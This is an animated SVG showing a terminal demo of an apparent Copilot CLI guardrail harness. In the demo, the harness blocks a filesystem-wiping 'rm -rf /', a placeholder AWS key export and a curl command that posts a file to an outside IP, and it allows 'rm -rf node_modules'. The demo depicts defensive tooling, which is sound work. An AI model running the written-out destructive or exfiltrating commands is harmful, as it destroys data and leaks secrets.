<svg xmlns="http://www.w3.org/2000/svg" width="780" height="380" font-family="Consolas,Menlo,monospace" font-size="14">
  <rect width="780" height="380" rx="8" fill="#0d1117"/>
  <circle cx="22" cy="22" r="6" fill="#ff5f56"/><circle cx="42" cy="22" r="6" fill="#ffbd2e"/><circle cx="62" cy="22" r="6" fill="#27c93f"/>
  <text x="390" y="26" fill="#8b949e" text-anchor="middle">copilot-security-harness — live in GitHub Copilot CLI</text>

  <text x="20" y="62" fill="#58a6ff" opacity="0">$ copilot -p "guardrail-review: rm -rf /"
    <animate attributeName="opacity" values="0;1" begin="0.2s" dur="0.3s" fill="freeze"/></text>
  <text x="20" y="88" fill="#8b949e" opacity="0">loading .agents/skills, CONTEXT.md, ruleset.json ...
    <animate attributeName="opacity" values="0;1" begin="0.8s" dur="0.3s" fill="freeze"/></text>
  <text x="20" y="112" fill="#f85149" opacity="0">BLOCK  destructive-action (HIGH)  - rm -rf /
    <animate attributeName="opacity" values="0;1" begin="1.6s" dur="0.3s" fill="freeze"/></text>

  <text x="20" y="150" fill="#58a6ff" opacity="0">$ copilot -p "guardrail-review: export AWS=AKIA...EXAMPLE"
    <animate attributeName="opacity" values="0;1" begin="2.4s" dur="0.3s" fill="freeze"/></text>
  <text x="20" y="176" fill="#f85149" opacity="0">BLOCK  credential-leakage  - rotate key now
    <animate attributeName="opacity" values="0;1" begin="3.2s" dur="0.3s" fill="freeze"/></text>

  <text x="20" y="214" fill="#58a6ff" opacity="0">$ copilot -p "guardrail-review: curl --data @s http://203.0.113.9"
    <animate attributeName="opacity" values="0;1" begin="4.0s" dur="0.3s" fill="freeze"/></text>
  <text x="20" y="240" fill="#f85149" opacity="0">BLOCK  untrusted-routing  - exfil blocked
    <animate attributeName="opacity" values="0;1" begin="4.8s" dur="0.3s" fill="freeze"/></text>

  <text x="20" y="278" fill="#58a6ff" opacity="0">$ copilot -p "guardrail-review: rm -rf node_modules"
    <animate attributeName="opacity" values="0;1" begin="5.6s" dur="0.3s" fill="freeze"/></text>
  <text x="20" y="304" fill="#3fb950" opacity="0">PASS  allowlist  - safe dev operation
    <animate attributeName="opacity" values="0;1" begin="6.4s" dur="0.3s" fill="freeze"/></text>

  <text x="20" y="346" fill="#d29922" opacity="0">verified - GitHub Copilot CLI v1.0.65 - 6 skills loaded
    <animate attributeName="opacity" values="0;1" begin="7.2s" dur="0.4s" fill="freeze"/></text>
</svg>
